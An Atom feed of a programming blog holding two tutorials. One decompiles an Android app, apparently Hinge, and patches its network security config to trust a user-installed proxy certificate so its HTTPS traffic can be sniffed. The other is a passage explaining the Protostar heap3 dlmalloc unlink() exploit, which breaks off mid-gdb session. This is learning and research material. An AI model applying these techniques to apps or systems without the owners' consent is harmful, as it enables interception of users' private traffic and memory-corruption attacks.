<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Programming & Software | David Xia]]></title>
  <link href="https://www.davidxia.com/categories/programming-and-software/atom.xml" rel="self"/>
  <link href="https://www.davidxia.com/"/>
  <updated>2020-10-20T12:13:44-04:00</updated>
  <id>https://www.davidxia.com/</id>
  <author>
    <name><![CDATA[David Xia]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[How to Analyze Mobile App Traffic and Reverse Engineer Its Non-Public API]]></title>
    <link href="https://www.davidxia.com/2020/10/how-to-analyze-mobile-app-traffic-and-reverse-engineer-its-non-public-api/"/>
    <updated>2020-10-16T17:08:35-04:00</updated>
    <id>https://www.davidxia.com/2020/10/how-to-analyze-mobile-app-traffic-and-reverse-engineer-its-non-public-api</id>
    <content type="html"><![CDATA[<p>Have you ever wanted to analyze the traffic between a mobile app and its servers or reverse engineer
a mobile app&rsquo;s non-public API? Here&rsquo;s one way.</p>

<p>The basic principle is to proxy the traffic from the app through a computer you control on which you
can capture and analyze traffic. If the app you&rsquo;re interested in is using an unencrypted protocol
like HTTP, this is pretty easy. Just run a proxy on your computer and configure your mobile device
to proxy network traffic through your computer&rsquo;s IP.</p>

<!-- more -->


<p>Most apps these days, however, use encrypted protocols like HTTPS (or are even required to by
default by mobile OSes). Data at the TCP layer and below like IP addresses and port numbers are
visible in plaintext, but all application level data at the HTTPS layer is encrypted. So you run a
proxy that supports HTTPS on your computer, but then your app doesn&rsquo;t trust the self-signed TLS
certificate your computer presents. Mobile apps used to trust certificates that the mobile device&rsquo;s
system trusted. So you could just download the self-signed certificate onto the mobile device and
configure the mobile OS to trust it. But these days mobile app frameworks let developers customize
their app&rsquo;s network security settings (<a href="https://developer.android.com/training/articles/security-config.html">like so for Android</a>).</p>

<p>Let&rsquo;s say your mobile app has custom trust anchors or pins certificates. What do you do now? You can
either</p>

<ol>
<li>disable the certificate check completely</li>
<li>or alter the certificate check</li>
</ol>


<p>I&rsquo;m not familiar with how to do this on iOS (there seem to be good resources out there <a href="https://www.guardsquare.com/en/blog/iOS-SSL-certificate-pinning-bypassing">like
this</a>) so will show how to do option two on Android.</p>

<h2>Setup mobile device and app</h2>

<p>I don&rsquo;t have an Android so used an emulator called <a href="https://www.genymotion.com/">Genymotion</a>. I created a Samsung Galaxy S9
virtual device which is has a recent enough Android OS to run most mobile apps. In order to install
the mobile app from the Google Play Store I had to install <a href="https://docs.genymotion.com/paas/7.0/07_Installing_OpenGApps.html#from-the-open-gapps-website">OpenGApps</a>. I think I&rsquo;m also able to
download the APK from the web and drag and drop it into the emulator to install.</p>

<!-- installed Hinge APK from here by drag and drop into emulator window
https://hinge-app.en.uptodown.com/android/download -->


<h2>Install Charles Proxy TLS certificate on device</h2>

<p>To install the <a href="https://www.charlesproxy.com/documentation/using-charles/ssl-certificates/">Charles cert</a>, I had to open <a href="http://www.charlesproxy.com/getssl/">this page</a> in Chrome. The built-in browser in the
emulator didn&rsquo;t seem to prompt me to download the Charles cert, but Chrome did. I installed Chrome
by install OpenGApps and then installing Chrome from the Play store. I think I also needed to
configure the Android device to use Charles as its proxy with <a href="https://stackoverflow.com/a/32865855">these steps</a> in order to get the
certificate download prompt. Then I made the Android device trust it.</p>

<h2>Patch the Android app&rsquo;s network security config</h2>

<p>I used `apktool to decompile the APK.</p>

<pre><code>brew install apktool

apktool d /path/to/app.apk
cd app
find . -name network_security_config.xml
./res/xml/network_security_config.xml

cat res/xml/network_security_config.xml

&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;network-security-config&gt;
    &lt;domain-config cleartextTrafficPermitted="true"&gt;
        &lt;domain includeSubdomains="true"&gt;res.cloudinary.com&lt;/domain&gt;
        &lt;domain includeSubdomains="true"&gt;app-res.cloudinary.com&lt;/domain&gt;
    &lt;/domain-config&gt;
&lt;/network-security-config&gt;
</code></pre>

<p>The app only allows cleartext to the above two domains. I don&rsquo;t see any pinned certificates, but
there must be some defaults since the app didn&rsquo;t trust the same certs trusted by the Android OS. So
I updated <code>network_security_config.xml</code> to be the following.</p>

<pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;network-security-config&gt;
    &lt;domain-config cleartextTrafficPermitted="true"&gt;
        &lt;domain includeSubdomains="true"&gt;res.cloudinary.com&lt;/domain&gt;
        &lt;domain includeSubdomains="true"&gt;app-res.cloudinary.com&lt;/domain&gt;
    &lt;/domain-config&gt;
    &lt;base-config&gt;
        &lt;trust-anchors&gt;
            &lt;certificates src="system" /&gt;
            &lt;certificates src="user" /&gt;
        &lt;/trust-anchors&gt;
    &lt;/base-config&gt;
&lt;/network-security-config&gt;
</code></pre>

<p>Then I tried recompiling the patched APK but got the following error.</p>

<pre><code>cd app
apktool b . -o ~/Downloads/app-patched.apk

I: Using Apktool 2.4.1
I: Checking whether sources has changed...
I: Smaling smali folder into classes.dex...
I: Checking whether sources has changed...
I: Smaling smali_classes10 folder into classes10.dex...
I: Checking whether sources has changed...
I: Smaling smali_classes9 folder into classes9.dex...
I: Checking whether sources has changed...
I: Smaling smali_classes7 folder into classes7.dex...
I: Checking whether sources has changed...
I: Smaling smali_classes6 folder into classes6.dex...
I: Checking whether sources has changed...
I: Smaling smali_classes8 folder into classes8.dex...
I: Checking whether sources has changed...
I: Smaling smali_classes3 folder into classes3.dex...
I: Checking whether sources has changed...
I: Smaling smali_classes4 folder into classes4.dex...
I: Checking whether sources has changed...
I: Smaling smali_classes5 folder into classes5.dex...
I: Checking whether sources has changed...
I: Smaling smali_classes2 folder into classes2.dex...
I: Checking whether resources has changed...
I: Building resources...
W: invalid resource directory name: /Users/dxia/Downloads/app/./res navigation
brut.androlib.AndrolibException: brut.common.BrutException: could not exec (exit code = 1): [/var/folders/y_/sjt8100n43g69mtr9t588d6r0000gp/T/brut_util_Jar_15064276297777137207.tmp, p, --forced-package-id, 127, --min-sdk-version, 21, --target-sdk-version, 29, --version-code, 160072564, --version-name, 7.21.0, --no-version-vectors, -F, /var/folders/y_/sjt8100n43g69mtr9t588d6r0000gp/T/APKTOOL339327577576851750.tmp, -e, /var/folders/y_/sjt8100n43g69mtr9t588d6r0000gp/T/APKTOOL5191817693537904820.tmp, -0, arsc, -I, /Users/dxia/Library/apktool/framework/1.apk, -S, /Users/dxia/Downloads/app/./res, -M, /Users/dxia/Downloads/app/./AndroidManifest.xml]
</code></pre>

<p>This <a href="https://github.com/iBotPeaches/Apktool/issues/1978#issuecomment-452894225">Github issue comment</a> suggested I run that command with the <code>--use-aapt2</code> switch.
Then I got another error.</p>

<pre><code>apktool b --use-aapt2 . -o ~/Downloads/app-patched.apk

I: Using Apktool 2.4.1
I: Checking whether sources has changed...
I: Checking whether sources has changed...
I: Checking whether sources has changed...
I: Checking whether sources has changed...
I: Checking whether sources has changed...
I: Checking whether sources has changed...
I: Checking whether sources has changed...
I: Checking whether sources has changed...
I: Checking whether sources has changed...
I: Checking whether sources has changed...
I: Checking whether resources has changed...
I: Building resources...
W: /Users/dxia/Downloads/app-patched/./res/values/public.xml:2119: error: resource 'drawable/$avd_hide_password__0' has invalid entry name '$avd_hide_password__0'. Invalid character '$avd_hide_password__0'.
W: /Users/dxia/Downloads/app-patched/./res/values/public.xml:2120: error: resource 'drawable/$avd_hide_password__1' has invalid entry name '$avd_hide_password__1'. Invalid character '$avd_hide_password__1'.
W: /Users/dxia/Downloads/app-patched/./res/values/public.xml:2121: error: resource 'drawable/$avd_hide_password__2' has invalid entry name '$avd_hide_password__2'. Invalid character '$avd_hide_password__2'.
W: /Users/dxia/Downloads/app-patched/./res/values/public.xml:2122: error: resource 'drawable/$avd_show_password__0' has invalid entry name '$avd_show_password__0'. Invalid character '$avd_show_password__0'.
W: /Users/dxia/Downloads/app-patched/./res/values/public.xml:2123: error: resource 'drawable/$avd_show_password__1' has invalid entry name '$avd_show_password__1'. Invalid character '$avd_show_password__1'.
W: /Users/dxia/Downloads/app-patched/./res/values/public.xml:2124: error: resource 'drawable/$avd_show_password__2' has invalid entry name '$avd_show_password__2'. Invalid character '$avd_show_password__2'.
W: error: resource android:style/Animation.InputMethodFancy is private.
W: error: resource android:style/Animation.VoiceInteractionSession is private.
W: error: resource android:style/AlertDialog is private.
W: /Users/dxia/Downloads/app-patched/./res/values-v24/styles.xml:10: error: style attribute 'android:attr/preferenceListStyle' is private.
W: /Users/dxia/Downloads/app-patched/./res/values-v24/styles.xml:40: error: style attribute 'android:attr/preferenceListStyle' is private.
W: /Users/dxia/Downloads/app-patched/./res/values-v24/styles.xml:70: error: style attribute 'android:attr/preferenceListStyle' is private.
W: /Users/dxia/Downloads/app-patched/./res/values-v24/styles.xml:99: error: style attribute 'android:attr/preferenceListStyle' is private.
W: /Users/dxia/Downloads/app-patched/./res/values-v28/styles.xml:8: error: style attribute 'android:attr/allowMassStorage' is private.
W: /Users/dxia/Downloads/app-patched/./res/values-v26/styles.xml:13: error: resource android:attr/internalMaxWidth is private.
W: /Users/dxia/Downloads/app-patched/./res/values-v26/styles.xml:16: error: resource android:attr/internalMaxWidth is private.
W: /Users/dxia/Downloads/app-patched/./res/values-v26/styles.xml:20: error: style attribute 'android:attr/internalMinHeight' is private.
W: /Users/dxia/Downloads/app-patched/./res/values-v28/styles.xml:17: error: resource android:attr/allowMassStorage is private.
W: /Users/dxia/Downloads/app-patched/./res/values-v28/styles.xml:20: error: resource android:attr/allowMassStorage is private.
W: error: resource android:style/DialogWindowTitle is private.
W: /Users/dxia/Downloads/app-patched/./res/values-v23/styles.xml:13: error: style attribute 'android:attr/attr/private_resource_pad36' not found.
W: /Users/dxia/Downloads/app-patched/./res/values-v23/styles.xml:14: error: style attribute 'android:attr/attr/private_resource_pad35' not found.
W: /Users/dxia/Downloads/app-patched/./res/values-v23/styles.xml:20: error: style attribute 'android:attr/attr/private_resource_pad36' not found.
W: /Users/dxia/Downloads/app-patched/./res/values-v23/styles.xml:21: error: style attribute 'android:attr/attr/private_resource_pad35' not found.
W: /Users/dxia/Downloads/app-patched/./res/values-v23/styles.xml:24: error: resource android:attr/private_resource_pad31 not found.
W: /Users/dxia/Downloads/app-patched/./res/values-v26/styles.xml:10: error: style attribute 'android:attr/internalMinHeight' is private.
brut.androlib.AndrolibException: brut.common.BrutException: could not exec (exit code = 1): [/var/folders/y_/sjt8100n43g69mtr9t588d6r0000gp/T/brut_util_Jar_11817644492691338390.tmp, link, -o, /var/folders/y_/sjt8100n43g69mtr9t588d6r0000gp/T/APKTOOL6551307854758959712.tmp, --package-id, 127, --min-sdk-version, 21, --target-sdk-version, 29, --version-code, 160072564, --version-name, 7.21.0, --no-auto-version, --no-version-vectors, --no-version-transitions, --no-resource-deduping, -e, /var/folders/y_/sjt8100n43g69mtr9t588d6r0000gp/T/APKTOOL6723837428467013762.tmp, -0, arsc, -I, /Users/dxia/Library/apktool/framework/1.apk, --manifest, /Users/dxia/Downloads/app-patched/./AndroidManifest.xml, /Users/dxia/Downloads/app-patched/./build/resources.zip]
</code></pre>

<p><a href="https://github.com/iBotPeaches/Apktool/issues/2386#issuecomment-669505659">This PR</a> fixes the above on Linux and Windows. As of this writing, it&rsquo;s not released
yet. So I had to <a href="https://ibotpeaches.github.io/Apktool/build/">build from source</a> on an Ubuntu VM.</p>

<pre><code>java -jar ~/Apktool/brut.apktool/apktool-cli/build/libs/apktool-cli-all.jar b --use-aapt2 . -o ~/Downloads/app-patched.apk

I: Using Apktool 2.4.2-3ac7e8-SNAPSHOT
I: Checking whether sources has changed...
I: Checking whether sources has changed...
I: Checking whether sources has changed...
I: Checking whether sources has changed...
I: Checking whether sources has changed...
I: Checking whether sources has changed...
I: Checking whether sources has changed...
I: Checking whether sources has changed...
I: Checking whether sources has changed...
I: Checking whether sources has changed...
I: Checking whether resources has changed...
I: Building apk file...
I: Copying unknown files/dir...
I: Built apk...
</code></pre>

<p>I signed the patched APK. First I generated some keys. I&rsquo;m not sure if certain signing and key
algorithms are required, but these are the ones I used.</p>

<pre><code>keytool -genkey -alias keys -keystore keys -sigalg MD5withRSA -keyalg RSA -keysize 2048 -validity 10000

Enter keystore password:
Re-enter new password:
What is your first and last name?
What is the name of your organizational unit?
What is the name of your organization?
What is the name of your City or Locality?
What is the two-letter country code for this unit?
Is CN=Unknown, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown correct?
Warning:
The generated certificate uses the MD5withRSA signature algorithm which is considered a security risk.

jarsigner -sigalg MD5withRSA -digestalg SHA1 -verbose -keystore keys app-patched.apk keys
</code></pre>

<p>Then when dragging and dropping the patched APK into the virtual device, I got an error saying the
app couldn&rsquo;t be installed. In these cases, generating the logs and grepping through them for errors
like <code>INSTALL_PARSE_FAILED_NO_CERTIFICATES</code> and <code>INSTALL_FAILED_VERIFICATION_FAILURE</code> helps. I fixed
this last error by <a href="https://stackoverflow.com/questions/15014519/apk-installation-failed-install-failed-verification-failure">disabling USB verification</a> in the virtual device
settings. The setting for this is inside the virtual Android device itself under &ldquo;developer
settings.&rdquo;</p>

<h2>Sniff the traffic</h2>

<p>I made sure the traffic was proxied through my computer, the patched app started successfully, and I
was able to see unencrypted data in Charles!</p>

<p><img class="center <a" src="href="https://i.imgur.com/e8p2Ne3h.jpg">https://i.imgur.com/e8p2Ne3h.jpg</a>&#8221;></p>

<h2>References</h2>

<ul>
<li>&ldquo;<a href="https://gist.github.com/unoexperto/80694ccaed6dadc304ad5b8196cbbd2c">How to patch Android app to sniff its HTTPS traffic with self-signed certificate</a>&rdquo;</li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[How to Exploit Dlmalloc Unlink(): Protostar Level Heap3]]></title>
    <link href="https://www.davidxia.com/2020/04/how-to-exploit-dlmalloc-unlink/"/>
    <updated>2020-04-19T18:51:48-04:00</updated>
    <id>https://www.davidxia.com/2020/04/how-to-exploit-dlmalloc-unlink</id>
    <content type="html"><![CDATA[<p>While stuck inside during social distancing, I&rsquo;ve been making my way through LiveOverflow&rsquo;s awesome
Youtube playlist &ldquo;<a href="https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN">Binary Exploitation / Memory Corruption</a>.&rdquo; His videos are structured
around a well known series of <a href="https://exploit-exercises.lains.space/protostar/">exploit exercises here</a> called &ldquo;Protostar.&rdquo; I took the
time to truly understand each one before moving onto the next as the exercises build on each
other. For the past several days I&rsquo;ve been trying to understand the <a href="https://exploit-exercises.lains.space/protostar/heap3/">&ldquo;Heap3&rdquo;
level</a>, a relatively complex level that requires manipulating the heap to redirect code
execution to an arbitrary function. After rewatching the video many times and reading numerous other
online explanations, I finally understand! That moment of understanding feels so gratifying.</p>

<p>Many other resources already explain the exploit well, but I&rsquo;m writing my own explanation to
reinforce my understanding and to celebrate.</p>

<!-- more -->


<h2>Exploit Exercise Protostar Heap3</h2>

<pre><code class="c">#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;stdio.h&gt;

void winner()
{
  printf("that wasn't too bad now, was it? @ %d\n", time(NULL));
}

int main(int argc, char **argv)
{
  char *a, *b, *c;

  a = malloc(32);
  b = malloc(32);
  c = malloc(32);

  strcpy(a, argv[1]);
  strcpy(b, argv[2]);
  strcpy(c, argv[3]);

  free(c);
  free(b);
  free(a);

  printf("dynamite failed?\n");
}
</code></pre>

<p>The source code is pretty straightforward. There&rsquo;s the <code>main()</code> and <code>winner()</code> functions. There&rsquo;s
three character pointers, three <code>malloc()</code>&rsquo;s, three <code>strcpy()</code>&rsquo;s, three <code>free()</code>&rsquo;s, and finally a
<code>printf()</code>. Our goal is to redirect code execution from <code>main()</code> to <code>winner()</code>.</p>

<p>The description at the top of the level is</p>

<blockquote><p>This level introduces the Doug Lea Malloc (dlmalloc) and how heap meta data can be modified to
change program execution.</p></blockquote>

<p>All these exercises are on 32-bit x86 architecture.</p>

<h2>Background on dlmalloc</h2>

<p>The vulnerable malloc is usually referred to as dlmalloc (named after one of its authors Doug Lea)
and must be an old version like <a href="https://gist.github.com/davidxia/a00062a8e2494f6cc3068a4ba147c98e">this one from 1996</a>. The <a href="http://phrack.org/issues/57/9.html"><em>Phrack</em> article &ldquo;Once
Upon a free()&hellip;&rdquo;</a> provides useful background.</p>

<blockquote><p>Most malloc implementations share the behaviour of storing their own management information, such
as lists of used or free blocks, sizes of memory blocks and other useful data within the heap
space itself.</p>

<p>The central attack of exploiting malloc allocated buffer overflows is to modify this management
information in a way that will allow arbitrary memory overwrites afterwards.</p></blockquote>

<p>For our purposes, skip to the &ldquo;GNU C Library implementation&rdquo; section. It says that memory slices or
&ldquo;chunks&rdquo; created by malloc are organized  like so. On 32-bit systems, <code>prev_size</code> and <code>size</code> are
4 bytes each. <code>data</code> is the user data section. <code>malloc()</code> returns a pointer to the address where
<code>data</code> starts.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>.            +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
</span><span class='line'>    chunk -> | prev_size                        |
</span><span class='line'>             +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
</span><span class='line'>             | size                             |
</span><span class='line'>             +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
</span><span class='line'>      mem -> | data                             |
</span><span class='line'>             : &hellip;                              :
</span><span class='line'>             +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
</span><span class='line'>nextchunk -> | prev_size &hellip;                    |
</span><span class='line'>             :                                  :</span></code></pre></td></tr></table></div></figure></p>

<p>The other important things to know about the vulnerable version(s) of dlmalloc are:</p>

<ul>
<li>The lowest bit of <code>size</code> called <code>PREV_INUSE</code> indicates whether the previous chunk is used or not</li>
<li>Once we <code>free()</code> the chunk using <code>free(mem), the memory is released, and if
its neighboring chunks aren't free, dlmalloc will clear the next chunk's</code>PREV_INUSE<code>and add the
chunk to a doubly-linked list of other free chunks. It does this by adding a forward and backward
pointer at</code>mem`.</li>
</ul>


<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>.            +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
</span><span class='line'>    chunk -> | prev_size                        |
</span><span class='line'>             +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
</span><span class='line'>             | size                             |
</span><span class='line'>             +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
</span><span class='line'>      mem -> | fd                               |
</span><span class='line'>             +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
</span><span class='line'>             | bk                               |
</span><span class='line'>             +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
</span><span class='line'>             | (old memory, can be zero bytes)  |
</span><span class='line'>             :                                  :&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>nextchunk -> | prev_size &hellip;                    |
</span><span class='line'>             :                                  :</span></code></pre></td></tr></table></div></figure></p>

<ul>
<li>If neighboring chunks are free, dlmalloc will merge them. Since free chunks are in a doubly-linked
list, dlmalloc merges by first removing the linked chunks from the list and tying the loose ends
of the list back together. This is done via a macro called <code>unlink()</code>.</li>
</ul>


<pre><code>#define unlink(P, BK, FD)                                                     \
{                                                                             \
  BK = P-&gt;bk;                                                                 \
  FD = P-&gt;fd;                                                                 \
  FD-&gt;bk = BK;                                                                \
  BK-&gt;fd = FD;                                                                \
}                                                                             \
</code></pre>

<p>Written with pointer notation:</p>

<pre><code class="c">BK = *(P + 12);  # content of memory address P + 12 stored in BK
FD = *(P + 8);   # content of memory address P + 8 stored in FD
*(FD + 12) = BK; # set the content of memory address FD + 12 to BK
*(BK + 8) = FD;  # set the content of memory address BK + 8 to FD
</code></pre>

<p>Since we can overwrite the bytes of P, we can overwrite 4-bytes of memory at two arbitrary places.
To trigger this code path, chunks being consolidated must be bigger than 80 bytes. dlmalloc
classifies these chunks as &ldquo;fastbins.&rdquo;</p>

<blockquote><p>An array of lists holding recently freed small chunks. Fastbins are not doubly linked.</p></blockquote>

<h2>What the heap looks like in heap3.c</h2>

<p>Run gdb on <code>heap3.c</code>. My personal preference is to set the disassembly-flavor to intel and turn off
pagination.</p>

<pre><code>user@protostar:~$ cd /opt/protostar/bin

user@protostar:/opt/protostar/bin$ gdb heap3
GNU gdb (GDB) 7.0.1-debian
Copyright (C) 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i486-linux-gnu".
For bug reporting instructions, please see:
&lt;http://www.gnu.org/software/gdb/bugs/&gt;...
Reading symbols from /opt/protostar/bin/heap3...done.

(gdb) set disassembly-flavor intel
(gdb) set pagination off
</code></pre>

<p>We first disassemble the <code>main()</code> function.</p>

<pre><code>(gdb) disassemble main
Dump of assembler code for function main:
0x08048889 &lt;main+0&gt;:    push   ebp
0x0804888a &lt;main+1&gt;:    mov    ebp,esp
0x0804888c &lt;main+3&gt;:    and    esp,0xfffffff0
0x0804888f &lt;main+6&gt;:    sub    esp,0x20
0x08048892 &lt;main+9&gt;:    mov    DWORD PTR [esp],0x20
0x08048899 &lt;main+16&gt;:   call   0x8048ff2 &lt;malloc&gt;
0x0804889e &lt;main+21&gt;:   mov    DWORD PTR [esp+0x14],eax
0x080488a2 &lt;main+25&gt;:   mov    DWORD PTR [esp],0x20
0x080488a9 &lt;main+32&gt;:   call   0x8048ff2 &lt;malloc&gt;
0x080488ae &lt;main+37&gt;:   mov    DWORD PTR [esp+0x18],eax
0x080488b2 &lt;main+41&gt;:   mov    DWORD PTR [esp],0x20
0x080488b9 &lt;main+48&gt;:   call   0x8048ff2 &lt;malloc&gt;
0x080488be &lt;main+53&gt;:   mov    DWORD PTR [esp+0x1c],eax
0x080488c2 &lt;main+57&gt;:   mov    eax,DWORD PTR [ebp+0xc]
0x080488c5 &lt;main+60&gt;:   add    eax,0x4
0x080488c8 &lt;main+63&gt;:   mov    eax,DWORD PTR [eax]
0x080488ca &lt;main+65&gt;:   mov    DWORD PTR [esp+0x4],eax
0x080488ce &lt;main+69&gt;:   mov    eax,DWORD PTR [esp+0x14]
0x080488d2 &lt;main+73&gt;:   mov    DWORD PTR [esp],eax
0x080488d5 &lt;main+76&gt;:   call   0x8048750 &lt;strcpy@plt&gt;
0x080488da &lt;main+81&gt;:   mov    eax,DWORD PTR [ebp+0xc]
0x080488dd &lt;main+84&gt;:   add    eax,0x8
0x080488e0 &lt;main+87&gt;:   mov    eax,DWORD PTR [eax]
0x080488e2 &lt;main+89&gt;:   mov    DWORD PTR [esp+0x4],eax
0x080488e6 &lt;main+93&gt;:   mov    eax,DWORD PTR [esp+0x18]
0x080488ea &lt;main+97&gt;:   mov    DWORD PTR [esp],eax
0x080488ed &lt;main+100&gt;:  call   0x8048750 &lt;strcpy@plt&gt;
0x080488f2 &lt;main+105&gt;:  mov    eax,DWORD PTR [ebp+0xc]
0x080488f5 &lt;main+108&gt;:  add    eax,0xc
0x080488f8 &lt;main+111&gt;:  mov    eax,DWORD PTR [eax]
0x080488fa &lt;main+113&gt;:  mov    DWORD PTR [esp+0x4],eax
0x080488fe &lt;main+117&gt;:  mov    eax,DWORD PTR [esp+0x1c]
0x08048902 &lt;main+121&gt;:  mov    DWORD PTR [esp],eax
0x08048905 &lt;main+124&gt;:  call   0x8048750 &lt;strcpy@plt&gt;
0x0804890a &lt;main+129&gt;:  mov    eax,DWORD PTR [esp+0x1c]
0x0804890e &lt;main+133&gt;:  mov    DWORD PTR [esp],eax
0x08048911 &lt;main+136&gt;:  call   0x8049824 &lt;free&gt;
0x08048916 &lt;main+141&gt;:  mov    eax,DWORD PTR [esp+0x18]
0x0804891a &lt;main+145&gt;:  mov    DWORD PTR [esp],eax
0x0804891d &lt;main+148&gt;:  call   0x8049824 &lt;free&gt;
0x08048922 &lt;main+153&gt;:  mov    eax,DWORD PTR [esp+0x14]
0x08048926 &lt;main+157&gt;:  mov    DWORD PTR [esp],eax
0x08048929 &lt;main+160&gt;:  call   0x8049824 &lt;free&gt;
0x0804892e &lt;main+165&gt;:  mov    DWORD PTR [esp],0x804ac27
0x08048935 &lt;main+172&gt;:  call   0x8048790 &lt;puts@plt&gt;
0x0804893a &lt;main+177&gt;:  leave
0x0804893b &lt;main+178&gt;:  ret
End of assembler dump.
</code></pre>

<p>The printf has become a <code>puts()</code>. <code>plt</code> stands for procedure linkage table, one of the structures
which makes dynamic loading and linking easier to use. <code>@plt</code> means we are calling <code>puts</code> at PLT
entry at address <code>0x8048790</code>. If we disassemble that address we see</p>

<pre><code>(gdb) disassemble 0x8048790
Dump of assembler code for function puts@plt:
0x08048790 &lt;puts@plt+0&gt;:    jmp    DWORD PTR ds:0x804b128
0x08048796 &lt;puts@plt+6&gt;:    push   0x68
0x0804879b &lt;puts@plt+11&gt;:   jmp    0x80486b0
End of assembler dump.
</code></pre>

<p>It calls another function at address <code>0x804b128</code>. This address is part of the Global Offset Table
(GOT) which points to the dynamically linked library containing the actual <code>puts()</code> function.</p>

<pre><code>(gdb) x 0x804b128
0x804b128 &lt;_GLOBAL_OFFSET_TABLE_+64&gt;:   0x08048796
</code></pre>

<p>We want to replace the call to <code>puts()</code> with a call to <code>winner()</code>. So we want to overwrite the
contents of <code>0x804b128</code> in the GOT, currently <code>0x08048796</code>, with the address to <code>winner()</code>.</p>

<p>To get a visual sense of what the heap looks like, set breakpoints at every library function
call, i.e. break at the address of <code>malloc()</code>, <code>strcpy()</code>, <code>free()</code>, and <code>puts()</code>.</p>

<pre><code>(gdb) break *0x8048ff2
Breakpoint 1 at 0x8048ff2: file common/malloc.c, line 3211.
(gdb) break *0x8048750
Breakpoint 2 at 0x8048750
(gdb) break *0x8049824
Breakpoint 3 at 0x8049824: file common/malloc.c, line 3583.
(gdb) break *0x8048790
Breakpoint 4 at 0x8048790
</code></pre>

<p>Run the program with some recognizable input strings.</p>

<pre><code>(gdb) r AAAAAAAAAAAA BBBBBBBBBBBB CCCCCCCCCCCC
Starting program: /opt/protostar/bin/heap3 AAAAAAAAAAAA BBBBBBBBBBBB CCCCCCCCCCCC

Breakpoint 1, malloc (bytes=32) at common/malloc.c:3211
3211    common/malloc.c: No such file or directory.
    in common/malloc.c
</code></pre>

<p>We&rsquo;ve hit the first breakpoint. Continue past it so that one <code>malloc()</code> is called and the heap is
initialized.</p>

<pre><code>(gdb) c
Continuing.

Breakpoint 1, malloc (bytes=32) at common/malloc.c:3211
3211    in common/malloc.c
</code></pre>

<p>Now look at the mapped memory regions.</p>

<pre><code>(gdb) info proc mapping
process 1542
cmdline = '/opt/protostar/bin/heap3'
cwd = '/opt/protostar/bin'
exe = '/opt/protostar/bin/heap3'
Mapped address spaces:

    Start Addr   End Addr       Size     Offset objfile
     0x8048000  0x804b000     0x3000          0        /opt/protostar/bin/heap3
     0x804b000  0x804c000     0x1000     0x3000        /opt/protostar/bin/heap3
     0x804c000  0x804d000     0x1000          0           [heap]
    0xb7e96000 0xb7e97000     0x1000          0
    0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
    0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
    0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
    0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
    0xb7fd9000 0xb7fdc000     0x3000          0
    0xb7fe0000 0xb7fe2000     0x2000          0
    0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
    0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
    0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
    0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
    0xbffeb000 0xc0000000    0x15000          0           [stack]
</code></pre>

<p>The heap starts at <code>0x804c000</code>, ends at <code>0x804d000</code>, and has size <code>0x1000</code> or 4096 bytes. We can
define hooks in gdb. We define one to examine the first 56 words of the heap in hexadecimal every
time execution stops.</p>

<pre><code>(gdb) define hook-stop
Type commands for definition of "hook-stop".
End with a line saying just "end".
&gt;x/56wx 0x804c000
&gt;end
</code></pre>

<p>If we continue, we hit the third malloc. At this point two <code>malloc()</code>&rsquo;s have been called.</p>

<pre><code>(gdb) c
Continuing.
